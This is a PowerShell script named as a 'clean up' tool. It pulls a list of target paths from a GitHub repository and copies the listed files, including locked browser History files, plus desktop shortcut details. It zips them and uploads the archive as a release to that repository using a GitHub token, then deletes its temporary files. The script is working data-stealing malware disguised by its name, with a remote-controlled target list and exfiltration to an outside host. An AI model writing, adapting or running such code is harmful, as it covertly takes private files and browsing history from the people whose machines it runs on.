# clean_up.ps1 - 带日志版

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$log = "$env:TEMP\upload_log.txt"
function Log($msg) {
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[${time}] $msg" | Out-File -FilePath $log -Append -Encoding utf8
}

Log "`n🟡 START TASK"

$token = $env:GITHUB_TOKEN
if (-not $token) {
    Log "❌ GITHUB_TOKEN is missing. Abort."
    return
}

$repo = "rtyuiuiop/1"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME

$tag         = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot    = "$env:TEMP\package-$computerName-$timestamp"
$zipName     = "package-$computerName-$timestamp.zip"
$zipPath     = Join-Path $env:TEMP $zipName

New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# STEP 1: 拉取路径列表
$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-paths.txt"
try {
    $content = Invoke-RestMethod $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $content -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ }
    Log "✅ Path list loaded from $remoteTxtUrl"
} catch {
    Log "❌ Failed to load upload-paths.txt: $_"
    return
}

# STEP 2: 复制文件
$index = 0
foreach ($path in $pathList) {
    $index++; $name = "item$index"
    if (-not (Test-Path $path)) {
        Log "⚠️ Skip (not found): $path"
        continue
    }

    $dest = Join-Path $tempRoot $name
    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            robocopy (Split-Path $path) $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
            Log "✅ Copied (History/locked): $path → $dest"
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force
            Log "✅ Copied (folder): $path → $dest"
        } else {
            Copy-Item $path -Destination $dest -Force
            Log "✅ Copied (file): $path → $dest"
        }
    } catch {
        Log "❌ Copy error at $path: $_"
    }
}

# STEP 3: 收集桌面快捷方式信息
try {
    $desktop  = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem $desktop -Filter *.lnk -ErrorAction SilentlyContinue
    $report   = ""
    foreach ($lnk in $lnkFiles) {
        $shell    = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $report  += "[$($lnk.Name)]`nTarget: $($shortcut.TargetPath)`nArgs: $($shortcut.Arguments)`n-----`n"
    }
    $report | Out-File (Join-Path $tempRoot "lnk_info.txt") -Encoding UTF8
    Log "✅ Desktop shortcut info saved"
} catch {
    Log "⚠️ Failed to collect .lnk info: $_"
}

# STEP 4: 压缩
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
    Log "✅ Compressed to $zipPath"
} catch {
    Log "❌ Compression failed: $_"
    return
}

# STEP 5: 上传 GitHub Release
$releaseData = @{
    tag_name   = $tag
    name       = $releaseName
    body       = "Automated file package from $computerName on $date"
    draft      = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "PowerShellScript"
    Accept        = "application/vnd.github.v3+json"
}

try {
    $rel = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $rel.upload_url -replace "{.*}", "?name=$zipName"
    Log "✅ Release created: $releaseName"
} catch {
    Log "❌ Failed to create release: $_"
    return
}

try {
    $bytes = [System.IO.File]::ReadAllBytes($zipPath)
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{ Authorization="token $token"; "Content-Type"="application/zip" } -Body $bytes -ErrorAction Stop
    Log "✅ Upload succeeded"
} catch {
    Log "❌ Upload failed: $_"
}

# STEP 6: 清理
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Log "🟢 Task completed.`n"
